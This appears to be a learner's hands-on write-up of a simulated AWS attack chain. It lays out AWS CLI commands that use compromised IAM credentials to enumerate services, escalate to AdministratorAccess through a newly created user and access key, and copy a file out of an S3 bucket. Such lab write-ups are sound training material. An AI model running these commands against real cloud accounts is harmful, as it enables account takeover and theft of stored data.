Attack Chain Design-1 

Here, I am going to, Simulate a full cloud attack chain by leveraging a compromised IAM user to enumerate AWS services, escalate privileges via IAM misconfiguration, and exfiltrate data from S3.

Attack Flow:
1. Initial Access:
IAM credentials compromised (simulated)
Set via aws configure --profile attacker

2. Recon & Enumeration:
Commands used:
aws sts get-caller-identity
aws iam list-users
aws s3 ls
Tools: AWS CLI, Pacu

3. Privilege Escalation:
Found iam:CreateUser, AttachUserPolicy allowed
Commands used:
aws iam create-user --user-name escalated-user
aws iam attach-user-policy \
  --user-name escalated-user \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name escalated-user

4. New Access & Role Assumption:
Used new keys to configure escalated profile
Verified full access:
aws ec2 describe-instances --profile escalated

5. S3 Data Exfiltration:
Listed all buckets, identified sensitive files
aws s3 cp s3://target-bucket/king.txt ./ --profile escalated

The Above Information is reffered from various websites & chatgpt, The Attack flow is Basic, And Built entirely hands-on by me.
Here, i learnt various things, what i can do by gaining the access of access & security keys.
